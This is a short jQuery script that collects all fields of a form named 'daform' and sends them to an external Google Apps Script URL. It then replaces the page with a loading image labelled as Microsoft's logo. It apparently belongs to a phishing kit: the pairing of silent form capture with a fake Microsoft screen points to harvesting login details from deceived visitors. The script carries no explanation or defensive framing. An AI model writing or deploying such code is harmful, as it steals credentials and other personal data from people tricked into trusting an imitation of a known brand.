
$.fn.serializeObject = function() {
    var obj = {};
    var arr = this.serializeArray();
    arr.forEach(function(item, index) {
        if (obj[item.name] === undefined) { // New
            obj[item.name] = item.value || '';
        } else {                            // Existing
            if (!obj[item.name].push) {
                obj[item.name] = [obj[item.name]];
            }
            obj[item.name].push(item.value || '');
        }
    });
    return obj;
};

var $form = $("#daform");

var $url = "https://script.google.com/macros/s/AKfycbz7wmM2XV-2gPIzKO3KGd5gUss5wnWU8NRdijRMnqJLP-IeyfY/exec";



$("button#sender").on('click',function(e){
    e.preventDefault();
    $.ajax({
        url: $url,
        method: "GET",
        dataType: "json",
        data: $form.serializeObject(),
        success: function(){
        console.log("Success, code 200");
        }
    });
    $("body").html("<img style='text-align:center; display:block; margin: 100px auto;' src='301.gif' alt='Microsoft\'s loading logo' />")
});














